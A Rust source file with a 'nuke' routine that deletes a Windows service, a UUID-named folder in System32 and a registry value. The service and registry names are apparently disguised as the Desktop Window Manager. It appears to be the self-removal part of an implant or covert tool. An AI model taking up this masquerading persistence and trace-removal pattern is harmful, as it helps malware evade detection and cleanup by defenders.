use std::path::Path;
use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};

pub fn nuke() {
    remove_persistence();
    remove_reg_keys();
}

fn get_uuid() -> String {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let dwm = match hklm.open_subkey("SOFTWARE\\Microsoft\\Windows\\Dwm") {
        Ok(dwm) => dwm,
        Err(_) => {
            println!("Dwm not found");
            std::process::exit(1)
        }
    };
    let value: String = match dwm.get_value("AnimationSessionUuid") {
        Ok(val) => val,
        Err(err) => {
            println!("{}", err);
            std::process::exit(1)
        }
    };
    value
}

#[allow(dead_code)]
fn remove_persistence() {
    // delete from startup
    let service_name = "DwmAnimationService";
    match std::process::Command::new("sc.exe")
        .args(&["delete", service_name])
        .output()
    {
        Ok(output) => {
            if !output.status.success() {
                let error_message = String::from_utf8_lossy(&output.stderr);
                println!(
                    "Failed to delete service {}: {}",
                    service_name, error_message
                );
            }
        }
        Err(err) => {
            println!("Failed to delete service {}: {}", service_name, err);
        }
    }

    let uuid = get_uuid();
    // delete subfolder in System32
    let system32_dir = Path::new(&std::env::var("SystemRoot").unwrap()).join("System32");
    match std::fs::remove_dir_all(system32_dir.join(&uuid)) {
        Ok(_) => {}
        Err(err) => {
            println!("{}", err);
            println!("Failed to delete uuid directory")
        }
    }
}

fn remove_reg_keys() {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = Path::new("SOFTWARE")
        .join("Microsoft")
        .join("Windows")
        .join("Dwm");
    let (key, _) = match hklm.create_subkey(&path) {
        Ok(key) => key,
        Err(err) => {
            println!("{}", err);
            std::process::exit(1)
        }
    };

    match key.delete_value("AnimationSessionUuid") {
        Ok(_) => {}
        Err(err) => {
            println!("{}", err);
            println!("Failed to delete uuid from registry")
        }
    };
}
